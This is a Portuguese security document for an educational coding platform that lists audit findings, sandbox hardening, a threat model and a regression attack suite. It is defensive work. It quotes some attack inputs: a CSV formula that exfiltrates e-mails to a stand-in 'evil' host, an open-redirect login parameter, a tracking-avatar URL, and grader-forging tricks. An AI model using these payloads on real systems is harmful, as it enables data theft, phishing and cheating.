# Segurança

## O que mudou desde a auditoria de 15/10/2026

| Achado da auditoria | Situação na v2 | Evidência |
|---|---|---|
| Chave `service_role` exfiltrável via `/proc/<pai>/environ` | **Eliminado**: o executor não tem segredos; o convidado WASI não enxerga `/proc` nem variáveis de ambiente | `apps/runner/test/sandbox.test.ts`, `apps/web/e2e/student.spec.ts` |
| Cliente grava progresso/XP direto no banco | **Eliminado**: só a API escreve, via `GamificationService`, após veredito do servidor | `apps/api/test/e2e/learning.e2e.ts` |
| Aprovação forjada (JSON de resultado, `__eq__`, patch no unittest) | **Eliminado** para casos declarativos: comparação na API sobre valores serializados | `grading.domain.spec.ts` |
| Gabarito lido via `sys.modules` | **Eliminado**: o sandbox não recebe valores esperados | `grading.domain.spec.ts` (buildProbes) |
| Sem limite de memória/rede/processos | **Eliminado**: fuel, timeout, 128 MB, sem sockets; container sem rede externa, FS somente leitura, sem capabilities | `sandbox.test.ts`, `infra/compose/compose.yml` |
| Python diferente entre Executar e Verificar | **Eliminado**: os dois em Python 3.14 (Pyodide 314.0.7 servido pelo próprio front, sem CDN de terceiros no `script-src`); divergências restantes documentadas | `pnpm --filter @levelusp/web test:paridade` (CI, job `sandbox`), [paridade-python.md](./paridade-python.md) |

Casos `legacy` (gabaritos antigos importados) continuam rodando junto do
código do aluno e são marcados como correção fraca (`strength: "legacy"`). O
curso Python Completo não tem mais nenhum: as 22 lições são corrigidas com
casos declarativos (`call`, `io`, `variable`, `source`, `expr`, `unittest`),
verificadas contra 72 soluções erradas plausíveis (ver
[motor-de-correcao.md](motor-de-correcao.md)).

## Endurecimento do executor (03/11/2026)

| Achado | Correção | Teste |
|---|---|---|
| Nonce e escritor de observações eram globais do `__main__` do harness, `probes.json` legível e o nonce em `sys.orig_argv`: forja trivial de caso `legacy` | Lote pelo stdin (esgotado antes do código do aluno); estado só no fecho de `_run_harness`; aluno recebe o próprio `__main__`; builtins/`os.write`/codificador JSON capturados | `sandbox.test.ts` ("não é forjável pelos caminhos óbvios") |
| Introspecção (frames, gc, trace, `_testcapi` via `_imp.create_builtin`) alcançava o estado do harness | Modo estrito com audit hook nas instâncias `legacy`/`unittest` | `sandbox.test.ts` |
| Serialização chamava `__iter__`/`isinstance` do aluno | Só tipos embutidos, checagem por `type()` e métodos C da classe base; limites de tamanho/profundidade | `sandbox.test.ts` (objetos hostis) |
| Classe do aluno chamada `ValueError`/`generator` se passava pelo embutido | Tipo embutido identificado por identidade; classes do aluno qualificadas (`__main__.X`) | `grading.domain.spec.ts`, `sandbox.test.ts` |
| Estado vazava entre sondas da mesma instância (arquivos, builtins, módulos) | Restauração entre sondas; `unittest` em instâncias separadas | `sandbox.test.ts`, `plan.test.ts` |

## Revisão independente (16/10/2026)

Uma revisão adversarial da v2 encontrou e corrigimos:

| Achado | Correção | Teste |
|---|---|---|
| Caso `legacy` forjável escrevendo o arquivo de observações | Observações saem pela saída padrão com nonce por execução; harness e sondas somente leitura | `sandbox.test.ts` |
| XP duplicado com conclusões simultâneas | Perfil travado antes de ler o progresso (serializa por aluno) | `learning.e2e.ts` (10 conclusões paralelas → 1 crédito) |
| XSS armazenado no conteúdo das lições | Sanitização na API (`sanitize-html`) + DOMPurify no front + CSP | `rich-content.spec.ts`, `sanitize.test.ts` |
| Professor apagando imagem de outro usuário via capa | Tabela `uploads` com dono; só aceita/apaga imagens do próprio usuário | `uploads.e2e.ts` |
| Bloqueio de conta permanente e enumeração por 429 | Bloqueio vencido zera a contagem; resposta 401 idêntica | `auth.e2e.ts` |
| Diferença de tempo/500 no "esqueci minha senha" | E-mail enviado fora da requisição | `auth.e2e.ts` |
| Gabarito da prova/quiz descoberto por tentativas | Correção por questão só após aprovação | — |
| Fila longa e jobs abandonados no executor | Fila de 20, cancelamento quando a API desiste, teto de saída | `sandbox.test.ts` |
| Limites por IP incompatíveis com NAT de laboratório | 60 logins/min e 1200 req/min por IP; proteção principal por conta | — |
| Swagger exposto em homologação | Só em dev por padrão | — |
| Uploads sem cota | 30 imagens/hora por usuário; avatar antigo é apagado | `uploads.e2e.ts` |

Riscos aceitos e conhecidos:

- **Casos `legacy`** dividem o interpretador com o aluno e recebem os valores
  esperados: `__eq__` trapaceiro ou monkeypatch do `unittest` aprovam. Só
  aparecem em conteúdo importado; converta-os (o editor avisa).
- **Casos declarativos** (`call`, `io`, `variable`, `expr`, `unittest`): o aluno
  pode alterar o que é observado (objetos hostis, builtins trocados e, por
  introspecção profunda fora do modo estrito, o próprio nonce), mas forjar a
  aprovação exige conhecer o valor esperado, que nunca entra no sandbox. Em
  `unittest`, exige saber se a suíte roda contra a referência ou um mutante.
- **Disco do executor**: o aluno pode gravar no próprio diretório do projeto
  dentro do tmpfs de 256 MB do container durante até 10 s.
- **Cadastro** responde "e-mail já cadastrado" (escolha de usabilidade).

## Modelo de ameaças e suíte de ataques (03/11/2026)

O LevelUSP vai sustentar um estudo com alunos reais: XP, nível, sequência,
badges e certificados são o **instrumento de medida** da pesquisa, e os dados
são pessoais (LGPD). Boa parte do código nasceu de ferramentas de IA (v0, LLMs),
então a suíte ataca primeiro as falhas típicas desse tipo de código e depois o
OWASP Top 10 2021, o OWASP API Top 10 2023 e as CVEs das versões instaladas.

### Ativos

| Ativo | Por que importa |
|---|---|
| Integridade de XP, progresso, badges, nota da prova e certificado | É o dado da pesquisa; fraude invalida a análise e o certificado |
| Gabaritos (casos de teste, `correct_index`, explicações) | Vazados, tornam a correção (e o XP) sem sentido |
| Dados pessoais (e-mail, nome, IP de sessão, submissões, notas, exportação LGPD) | Obrigação legal; vazamento expõe estudantes |
| Credenciais e sessões (hash argon2id, token de sessão, links de senha) | Tomada de conta, inclusive de professor/admin |
| Segredos de infraestrutura (`DATABASE_URL`, `RUNNER_TOKEN`, SMTP, token do túnel) | Acesso direto ao banco ou ao executor |
| Disponibilidade durante as aulas | Laboratório inteiro depende da plataforma ao mesmo tempo |

### Atores

| Ator | Capacidade | Objetivo típico |
|---|---|---|
| Anônimo (internet) | Rotas públicas, força bruta, varredura, cargas maliciosas no Next | Tomar contas, derrubar o serviço, explorar CVE do framework |
| Aluno autenticado | Toda rota de aluno, ferramentas do navegador, scripts | XP/certificado sem mérito, gabarito, ver dados de colegas, ranking |
| Professor | Cria lições/cursos/quizzes, sobe imagens | Alterar curso de outro professor, XSS no conteúdo, ver gabarito alheio |
| Admin comprometido ou descuidado | Painel administrativo, exportações CSV | (vítima) CSV com fórmula, phishing por redirect |
| Dependência comprometida / alucinada | Código executado no build ou no servidor | Exfiltrar segredos, backdoor (pacote inventado por IA e registrado por terceiros) |

### Fronteiras de confiança

```
navegador ──HTTPS──▶ Cloudflare/Caddy ──▶ web (Next, 3000) ──rewrite /api──▶ api (Nest, 4000) ──▶ PostgreSQL
                                                                   └──token──▶ runner (WASI)
```

1. **Navegador → front/API**: tudo que vem do cliente é hostil (corpo, cabeçalhos, cookie, `X-Forwarded-For`).
2. **Next → API**: o Next repassa `/api/*` sem autenticar; a API é a única autoridade (o middleware do Next só redireciona).
3. **API → executor**: o código do aluno roda isolado e só devolve observações (coberto pela outra suíte: `apps/runner/test/attacks`).
4. **Repositório público → build/produção**: dependências do npm e valores publicados no repositório não são confiáveis.

**Proxy e IP do cliente** (verificado com um servidor-eco atrás do `next start`):
o rewrite do Next **repassa o `X-Forwarded-For` sem acrescentar nada** e não o cria
quando ausente. Com `TRUST_PROXY=true` (1 salto), a API usa a entrada mais à
direita, que é o IP real porque o Cloudflare **acrescenta** o IP do visitante e o
Caddy **substitui** o cabeçalho. Portanto o limite por IP não é contornável
trocando o `X-Forwarded-For` (`auth-session.e2e.ts`). Não exponha a porta 3000 do
front diretamente com `TRUST_PROXY=true`: sem proxy na frente, o cliente escolheria o IP.

### Como rodar

```bash
TEST_DATABASE_URL=... pnpm --filter @levelusp/api test:security   # 99 ataques à API (PostgreSQL real)
E2E_BASE_URL=http://localhost:3000 pnpm --filter @levelusp/web test:security   # 12 ataques à web (pilha completa)
pnpm security:deps        # cadeia de suprimentos (registry npm, typosquatting, lockfile, pnpm audit)
pnpm security:web-bundle  # build da web com segredos-canário + varredura do que vai ao navegador
pnpm test:security        # todas as suítes de segurança do monorepo (inclui as do executor)
```

No CI, o job `seguranca` roda API, cadeia de suprimentos e bundle; os ataques à
web rodam no job `e2e` (Playwright, pasta `apps/web/e2e/security`).

### Achados e correções

| # | Severidade | Ataque | Cenário de exploração | Correção | Teste de regressão |
|---|---|---|---|---|---|
| 1 | **Crítico** | CVEs do Next.js 16.2.0 (30+ advisories) | RCE não autenticado no otimizador de imagens (GHSA-2xp9-vwfh-vxw4, GHSA-2464-fhr4-w9xw), bypass de middleware (GHSA-267c/26hh/492v), DoS em Server Actions/RSC (GHSA-q4gf, GHSA-m99w), cache poisoning | Next 16.4.5 (e `eslint-config-next`) | `pnpm security:deps` (pnpm audit), `web-attacks.spec.ts` |
| 2 | **Alto** | Força bruta em paralelo | O contador de senhas erradas era lido e regravado pela aplicação: 30 tentativas simultâneas liam o mesmo valor e a conta **nunca bloqueava** (força bruta limitada só a 60/min por IP — e um conjunto de IPs multiplica isso) | `UPDATE` atômico no banco (`failed_login_count + 1`, bloqueio na mesma instrução) e nova checagem do bloqueio antes de abrir a sessão | `auth-session.e2e.ts` ("tentativas em PARALELO também bloqueiam") |
| 3 | Médio | Open redirect no login | `/login?next=/%09/evil.example` passava no filtro de prefixos; o navegador descarta o TAB e `location.assign("/\t/evil")` vai para `https://evil.example` após o login (phishing com o domínio da USP no link) | `safeRedirectPath` decide pelo parser de URL (mesma origem) e devolve o caminho normalizado | `redirect.test.ts`, `web-attacks.spec.ts` |
| 4 | Médio | Injeção de fórmula em CSV | Aluno usa como nome `=HYPERLINK("https://evil/?d="&C2;"Ver")`; o admin exporta "usuários" e abre no Excel: a célula vira link/fórmula que envia e-mails de colegas | Célula de texto que começa com `= + - @ TAB CR` recebe `'` | `csv.test.ts` |
| 5 | Médio | Rastreamento por avatar externo (LGPD) | `PATCH /me/profile {avatar_url:"https://meu-servidor/pixel.png"}`: o avatar aparece no ranking público e cada visitante entrega IP e horário ao servidor do aluno | Avatar só aceita imagem enviada pelo próprio usuário (ou nenhuma) | `uploads.e2e.ts` |
| 6 | Médio | DoS por multipart | O upload aceitava campos de texto sem limite de quantidade (1 MB cada, em memória): requisições paralelas de 10 MB (limite do Caddy; 100 MB no Cloudflare) esgotam a memória da API | `fields: 0`, `parts: 1`, `fieldSize: 0` no multer | `uploads.e2e.ts` |
| 7 | Médio | Credencial de demonstração em servidor | `homolog.env.example` tinha `SEED_DEMO_USERS=true` sem senha própria: a homologação exposta pelo túnel ganhava a professora `professora@levelusp.dev` com a senha publicada no README | Seed só usa a senha pública com banco local; em servidor exige `SEED_DEMO_PASSWORD` (12+) | `insecure-defaults.e2e.ts` (`resolveDemoPassword`) |
| 8 | Médio | Dependências com DoS | body-parser 2.3.0 (GHSA-27r3-jxmh-p828), multer 2.4.0 (GHSA-q7qp-rjg7-q26m), nodemailer 10.1.1 (GHSA-8c8m/m943/85x2), zod 3.25 na web (GHSA-mrhx-c7xc-m3w5) | `overrides` do pnpm para body-parser ≥ 2.4 e multer ≥ 2.5; nodemailer 10.3; web em zod 4 | `pnpm security:deps` |
| 9 | Baixo | Link de redefinição vazado | Trocar ou redefinir a senha não invalidava outros links pendentes: um link antigo (e-mail encaminhado, caixa comprometida) redefinia a senha de novo dentro de 60 min | Troca e redefinição marcam todos os tokens pendentes como usados | `auth-session.e2e.ts` |
| 10 | Baixo | Segredo publicado aceito na partida | Homolog/prod subiam com `RUNNER_TOKEN` de dev/CI (está no repositório), senha de banco `levelusp`/`postgres` ou o placeholder `__gerar__` | `loadEnv` recusa esses valores fora de dev/test | `env.spec.ts`, `insecure-defaults.e2e.ts` |
| 11 | Baixo | Forja de `x-request-id` | O id enviado pelo cliente ia para o cabeçalho de resposta e para o log sem validação (aspas, `key=value`): forja de correlação em incidentes | Só reaproveita `[\w.-]{1,64}`; senão gera UUID | `injection.e2e.ts` |
| 12 | Baixo | Corrida no cadastro | Cadastros simultâneos com o mesmo e-mail: o perdedor recebia 500 (violação de unicidade) | Violação de unicidade vira 409 `EMAIL_TAKEN` (colisão de username tenta outro) | `insecure-defaults.e2e.ts` |
| 13 | Baixo | Impressão digital e filtro legado | `X-Powered-By: Next.js`; `X-XSS-Protection: 1; mode=block` (filtro removido dos navegadores, já foi canal de vazamento) | `poweredByHeader: false`; `X-XSS-Protection: 0` | `web-attacks.spec.ts` |

### Catálogo de ataques

Categoria: **IA** = falha típica de app gerado por IA; **OWASP** = Top 10 2021 / API Top 10 2023;
**CVE** = vulnerabilidade conhecida da pilha. Resultado: *bloqueado* (já era seguro, o teste
prova que continua), *corrigido* (achado acima) ou *aceito* (risco documentado).

| Ataque | Categoria | Arquivo de teste | Resultado | Correção |
|---|---|---|---|---|
| Segredos/variáveis de servidor/hosts internos/source maps no bundle e no RSC | IA · A05 | `packages/security` (`web-bundle`), `web-attacks.spec.ts` | bloqueado | — |
| Autorização só na interface: matriz gerada das rotas do Express (401/403 por papel; rota nova sem classificação quebra o teste) | IA · API5 · A01 | `route-matrix.e2e.ts` | bloqueado | — |
| Cookie forjado, revogado, gigante ou malformado | A07 | `route-matrix.e2e.ts` | bloqueado | — |
| BOLA/IDOR em notas, notificações, snapshots, matrículas, tentativas de prova, certificados, solicitações, exportação, cursos, lições, quizzes e uploads | IA · API1 · A01 | `bola-idor.e2e.ts` | bloqueado | — |
| Mass assignment (`role`, `xp`, `level`, `user_id`, `created_by`, `status`, `published`, datas…) em toda rota de escrita | IA · API3 | `mass-assignment.e2e.ts` | bloqueado | política: `z.object` remove chaves desconhecidas; teste garante que nenhum schema exportado é `loose` |
| XP/conclusão sem veredito (`/complete` em código/quiz, campos de aprovação no corpo, prévia de rascunho) | IA · API6 | `business-logic.e2e.ts` | bloqueado | — |
| Corrida/replay: conclusão, quiz, envio e início de prova, emissão de certificado em paralelo | IA · API6 | `business-logic.e2e.ts` | bloqueado | — |
| Gabarito em respostas (quiz, prova, status, reprovação) | IA · API3 | `business-logic.e2e.ts`, `bola-idor.e2e.ts` | bloqueado | — |
| Números negativos/enormes/NaN e `limit` fora da faixa; ranking com professor/suspenso | API6 · A04 | `business-logic.e2e.ts` | bloqueado | — |
| SQL injection em parâmetros de rota, consulta, login, reset e campos gravados (inclui `pg_sleep`) | A03 | `injection.e2e.ts` | bloqueado | Drizzle parametriza; `sql.raw` só com constantes |
| XSS armazenado (HTML rico de lição/curso, Markdown, nome, bio) e refletido | A03 | `injection.e2e.ts`, `web-attacks.spec.ts` | bloqueado | sanitize-html na API + DOMPurify/react-markdown na web |
| XSS no PDF do certificado (nome/título com HTML e operadores PDF) | A03 | `injection.e2e.ts` | bloqueado | — |
| Poluição de protótipo (`__proto__`, `constructor.prototype`) em corpos, registros e configurações | A08 | `injection.e2e.ts` | bloqueado | — |
| Bombas JSON (1 MB+, 200 mil níveis), XML/XXE, JSON malformado | API4 · A05 | `injection.e2e.ts` | bloqueado | — |
| ReDoS nas regex que recebem texto do usuário | API4 | `injection.e2e.ts` | bloqueado | — |
| Travessia de caminho (`/files/:name`, arquivos do projeto, nome do upload) | A01 | `injection.e2e.ts`, `uploads.e2e.ts` | bloqueado | — |
| Injeção em log/cabeçalho (`x-request-id`) | A09 | `injection.e2e.ts` | corrigido | #11 |
| Força bruta sequencial e paralela; resposta igual para conta bloqueada | A07 · API2 | `auth-session.e2e.ts` | corrigido | #2 |
| Contorno do limite por IP com `X-Forwarded-For` forjado | A07 | `auth-session.e2e.ts` | bloqueado | topologia documentada acima |
| Enumeração de usuários (login, "esqueci a senha", conta convidada) | A07 | `auth-session.e2e.ts` | aceito em parte | o cadastro responde "e-mail já cadastrado" (usabilidade) |
| Fixação de sessão; revogação no logout, troca de senha, redefinição, suspensão e rebaixamento | A07 | `auth-session.e2e.ts` | bloqueado | — |
| Token de redefinição: reuso, expiração, forjado, link antigo após troca | A07 | `auth-session.e2e.ts` | corrigido | #9 |
| CSRF em toda rota que altera estado (sem cabeçalho, valor errado, `text/plain`) e de outra origem no navegador | A01 | `auth-session.e2e.ts`, `web-attacks.spec.ts` | bloqueado | — |
| CORS permissivo | A05 | `auth-session.e2e.ts` | bloqueado | — |
| Open redirect no login (`next=/%09/…`) | A01 | `redirect.test.ts`, `web-attacks.spec.ts` | corrigido | #3 |
| Injeção de fórmula em CSV do admin | A03 | `csv.test.ts` | corrigido | #4 |
| Upload: SVG/HTML, MIME forjado, poliglota PNG+HTML, tamanho, cota, multipart abusivo | A04 · API4 | `uploads.e2e.ts` | corrigido | #6 |
| SSRF/rastreamento por URL externa de avatar | A10 · LGPD | `uploads.e2e.ts` | corrigido | #5 (a API não busca URLs de usuário) |
| SSRF no otimizador de imagens do Next | CVE · A10 | `web-attacks.spec.ts` | bloqueado | só imagens locais |
| Swagger/depuração, stack trace/SQL em erro, readiness, flags do cookie em produção | IA · A05 | `insecure-defaults.e2e.ts` | bloqueado | — |
| Segredos fracos/publicados aceitos na partida; senha pública de demonstração | IA · A05 · A07 | `insecure-defaults.e2e.ts`, `env.spec.ts` | corrigido | #7, #10 |
| Cabeçalhos (CSP, clickjacking, nosniff, referrer, `X-Powered-By`) | A05 | `web-attacks.spec.ts`, `insecure-defaults.e2e.ts` | corrigido | #13 |
| Bypass do middleware por `x-middleware-subrequest` (CVE-2025-29927) | CVE | `web-attacks.spec.ts` | bloqueado | 16.4.5; o middleware também não autoriza nada |
| Carga Flight maliciosa em Server Action (CVE-2025-55182 "React2Shell") | CVE | `web-attacks.spec.ts` | bloqueado | 16.4.5 + React 19.3; o app não define Server Actions |
| Pacote alucinado, typosquatting, lockfile adulterado, advisories | IA · A06 · A08 | `packages/security` (`deps`) | corrigido | #1, #8 |

### Versões e advisories verificados

Consultas ao banco de advisories do npm (o mesmo do `npm audit`/`pnpm audit`) em
03/11/2026 para as versões do `pnpm-lock.yaml`. "Aplicável" = afeta a versão instalada.

| Pacote@versão | Advisories conferidos | Aplicável? | Evidência |
|---|---|---|---|
| next@16.2.0 → **16.4.5** | GHSA-2xp9-vwfh-vxw4, GHSA-2464-fhr4-w9xw, GHSA-673q-mjm6-r5xr (RCE); GHSA-vcvr-r3jv-pc5j (next/og, não usado); GHSA-p293-qw3h-jr36 (Windows); GHSA-267c/26hh/492v/36qx/6gpp (bypass de middleware); GHSA-c4j6, GHSA-89xv, GHSA-p9j2, GHSA-cjq9 (SSRF); GHSA-q4gf, GHSA-8h8q, GHSA-m99w, GHSA-p3m5, GHSA-mg66, GHSA-h64f, GHSA-q8wf (DoS); GHSA-3g8h, GHSA-wfc6, GHSA-vfv6, GHSA-4jqv, GHSA-mcj8, GHSA-68g3, GHSA-4633 (cache); GHSA-ffhc, GHSA-gx5p (XSS); GHSA-955p, GHSA-f87g, GHSA-39w2 (exposição) | **Sim em 16.2.0**; não em 16.4.5 | `pnpm audit --prod` antes/depois |
| next (histórico) | GHSA-f82v-jwr5-mffw (CVE-2025-29927, middleware), GHSA-9qr9-h5gf-34mp (CVE-2025-66478, React2Shell no Next) | Não (corrigidos em 15.2.3 e 16.0.7) | `web-attacks.spec.ts` |
| React RSC embutido no Next 16.4.5 (19.3.x) / react@19.3.1 | GHSA-fv66-9v8q-g76r (CVE-2025-55182, RCE), GHSA-925w-6v3x-g4j4 (exposição de código), GHSA-2m3v, GHSA-7gmr, GHSA-83fc, GHSA-479c, GHSA-rv78, GHSA-wx67 (DoS) | Não (faixas afetadas só até 19.2.x) | npm advisories; carga Flight do PoC recusada com 400 |
| express@5.2.1 | GHSA-qw6h-vgh9-j6wx, GHSA-rv95-896h-c2vc, GHSA-gpvr-g6gh-9mc2 | Não (4.x) | npm advisories |
| body-parser@2.3.0 → **2.4.0** | GHSA-27r3-jxmh-p828 (DoS com corpo comprimido); GHSA-v422-hmwv-36x6, GHSA-qwcr-r2fm-qrc7 | **Sim em 2.3.0** (só o primeiro) | override no `pnpm-workspace.yaml` |
| multer@2.4.0 → **2.5.0** | GHSA-q7qp-rjg7-q26m; histórico GHSA-44fp, 4pg4, fjgf, g5hg, 535w, 5528, 72gw, wc9g, xf7r, v52c, 3p4h, qvfw | **Sim em 2.4.0** (só o primeiro) | override; limites de campos no controller |
| qs@6.16.1 | GHSA-6rw7-vpxm-498p, GHSA-w7fw-mjwx-w883, GHSA-4mjr-xmp4-gh2g, GHSA-6pq8-jhm2-2vcw, GHSA-q8mj-m7cp-5q26, GHSA-hrpp-h998-j3pp | Não | npm advisories |
| path-to-regexp@8.4.2 | GHSA-j3q9-mxjg-w52f, GHSA-27v5-c462-wpq7, GHSA-9wv6-86v2-598j, GHSA-rhx6-c78j-4q9w, GHSA-37ch-88jc-xwx2 | Não | npm advisories |
| cookie@0.7.2, send@1.2.1, serve-static@2.2.1 | GHSA-pxg6-pf52-xh8x, GHSA-m6fv-jmcg-4jfg, GHSA-cm22-4g7w-348p | Não | npm advisories |
| @nestjs/core, common, platform-express@12.1.3 | GHSA-36xv-jgw5-4q75, GHSA-cj7v-w2c7-cp7c | Não (≤ 11.x) | npm advisories |
| drizzle-orm@0.45.4 | GHSA-gpj5-g38j-94v9 (SQL injection por identificadores) | Não (< 0.45.2); o código também não usa `sql.identifier` com entrada do usuário | npm advisories, `injection.e2e.ts` |
| pg@8.23.1 | GHSA-wc9v-mj63-m9g5 | Não | npm advisories |
| @node-rs/argon2@2.2.2, bcryptjs@3.0.3, pdfkit@0.20.2, pdf-lib@1.17.1, helmet@8.3.0, cookie-parser@1.4.7 | nenhum advisory publicado | Não | npm advisories |
| nodemailer@10.1.1 → **10.3.1** | GHSA-8c8m-p3m8-cjg8, GHSA-m943-m63m-w62w, GHSA-85x2-q946-cp5h (addressparser); histórico de 20+ (CRLF, ReDoS, TLS) | **Sim em 10.1.1** (os três primeiros; endereços vêm de cadastro/convite) | atualização |
| sanitize-html@2.18.1 | GHSA-cv27-6wvh-8x7j, GHSA-x3q4-9hxx-gx8m, GHSA-g8qq-57p8-ggw5, GHSA-jxwj-j7wr-gfrw, GHSA-vccv-cmxp-4j9h (bypass/mXSS), GHSA-cgfm-xwp7-2cvr (ReDoS) | Não (corrigidos até 2.18.0) | npm advisories, `injection.e2e.ts` |
| dompurify@3.4.17 | GHSA-mrv2-3pqr-j5jr, GHSA-c6gr-qvv4-5v3f, GHSA-6688-9rhm-gjv2, GHSA-55q2-fjhq-7xh7 e outros 20+ (IN_PLACE, hooks, mXSS) | Não (até 3.4.16); o app não usa `IN_PLACE` nem hooks | npm advisories, `web-attacks.spec.ts` |
| zod@3.25.76 (web) → **4.6.7** | GHSA-mrhx-c7xc-m3w5 | Sim na versão, mas sem entrada do atacante (só env e worker local) | web migrada para zod 4 |
| postcss@8.4.31 (dentro do Next 16.2) | GHSA-qx2v, GHSA-6g55, GHSA-fxqj, GHSA-r28c | Só no build; resolvido com o Next 16.4.5 (postcss 8.5.23) | `pnpm audit` |
| sharp@0.34.5 (Next 16.2) → 0.35.5 | GHSA-f88m-g3jw-g9cj, GHSA-rgj7-g3m4-5g8c, GHSA-wq5f-xc86-pv6w (libvips/libheif/librsvg) | Sim em 16.2.0 (otimizador de imagens) | Next 16.4.5 |
| minimatch@3.1.5/10.2.6 | GHSA-g3hv-75wg-m249 | Não em produção (só no ESLint) | aceito até 2027-03-01 em `packages/security/src/supply-chain.ts` |

A verificação de cadeia de suprimentos (136 dependências diretas, 1451 pacotes no
lockfile) não encontrou pacote inexistente, hash divergente do registry, dependência
git/tarball fora do registry nem nome parecido com pacote popular. Observação:
`sweetalert2` (≥ 11.4.9) tem comportamento de protesto em domínios `.ru/.su/.by`
— irrelevante para `usp.br`, mas é um exemplo de por que versões novas merecem revisão
(o `security:deps` avisa quando a versão resolvida tem menos de 7 dias).

### Riscos aceitos (suíte de ataques)

- **Oráculo de nota no quiz**: a correção devolve quantas questões acertou; com 10
  envios/min, trocar uma resposta por vez revela o gabarito de um quiz formativo. O XP é
  creditado uma vez só. Na prova final o sorteio, o intervalo de 60 min e o limite de 10/h
  tornam isso inviável.
- **CSP com `'unsafe-inline'` e `'unsafe-eval'`**: exigidos pelo Next sem nonce e pelo
  Pyodide; a defesa contra XSS é a sanitização em duas camadas (testada acima).
- **Professor define o XP da lição (até 5000)** e pode inflar o XP dos próprios alunos; é
  uma fronteira de confiança (professores são aprovados pela coordenação) — vale auditar
  lições com XP fora do padrão antes da análise do estudo.
- **Readiness público** informa `APP_ENV` e versão (útil para o orquestrador).
- **Limites por IP e por usuário em memória**: valem por instância da API.

## Controles

- **Autenticação**: senha argon2id (parâmetros OWASP), migração transparente de
  bcrypt do Supabase; sessão opaca de 256 bits em cookie `httpOnly`,
  `SameSite=Lax`, `Secure` fora de dev; banco guarda só o SHA-256 do token;
  revogação no logout, troca/redefinição de senha e suspensão.
- **Força bruta**: 60 tentativas/min por IP nas rotas de credencial; bloqueio de
  15 min após 10 senhas erradas, contado num `UPDATE` atômico (vale para rajadas
  paralelas; resposta idêntica à de senha errada); tempo constante quando o e-mail
  não existe. Trocar/redefinir a senha invalida os links de redefinição pendentes.
- **CSRF**: cabeçalho `x-levelusp-csrf` obrigatório em métodos que alteram estado
  (a API não habilita CORS) + `SameSite=Lax`.
- **Autorização**: guard global deny-by-default, `@Roles()`, checagem de dono no
  service; rascunhos de outros respondem 404.
- **Validação**: toda entrada passa por schema Zod; caminhos de arquivo do aluno
  sem `..` nem caminho absoluto; uploads verificados pelos bytes (PNG/JPEG/WebP, 2 MB,
  um arquivo e nenhum outro campo no multipart); avatar só com imagem do próprio usuário.
- **Erros**: mensagens pt-BR genéricas; stack traces só no log; `x-request-id`
  para correlação (o do proxy só é reaproveitado se for um identificador simples).
- **Logs**: pino estruturado com redação de cookie, `authorization` e senha.
- **Cabeçalhos**: helmet na API (CSP `default-src 'none'`), cabeçalhos de
  segurança no Next. O núcleo do Pyodide é servido pelo próprio front, com
  SHA-256 conferido no build; `script-src` não libera outra origem e só os
  wheels de pacotes extras vêm do CDN oficial (`connect-src`).
- **Infra**: imagens não-root, `read_only`, `cap_drop: ALL`,
  `no-new-privileges`, redes internas sem rota para a internet para banco e
  executor; só o front escuta em `127.0.0.1`; acesso público pelo túnel (na VM:
  túnel nomeado ou Caddy com HTTPS, limites de CPU/memória e healthchecks em
  todos os serviços — `infra/compose/compose.vm.yml`).
- **Configuração**: API e front validam as variáveis na partida (Zod) e não sobem
  com `PUBLIC_BASE_URL` ausente, `http` ou `localhost` em produção, nem com
  `RUNNER_TOKEN`/senha de banco publicados no repositório (homolog/prod); SMTP exige
  STARTTLS/TLS fora de dev e falhas de envio nunca chegam à resposta HTTP.
- **Auditoria**: ações administrativas registradas em `audit_log`.
- **LGPD**: exportação dos próprios dados e exclusão da conta pelo usuário.

## Antes de abrir para alunos reais

1. Rotacionar a chave `service_role` do Supabase antigo (já exposta) e desligar o projeto após o corte.
2. Configurar SMTP para confirmação e redefinição de senha.
3. ~~Converter os gabaritos `legacy` para casos declarativos.~~ Feito no curso
   Python Completo; conteúdo importado do Supabase ainda precisa ser convertido.
4. Mover produção para um servidor institucional (dados de alunos fora do notebook).

O passo a passo de cada item (com comandos e caixas de seleção) está em
[producao-vm.md § 11](./producao-vm.md#11-antes-de-abrir-para-alunos-reais); backups cifrados,
retenção e o procedimento de eliminação ao final do estudo, na § 10.
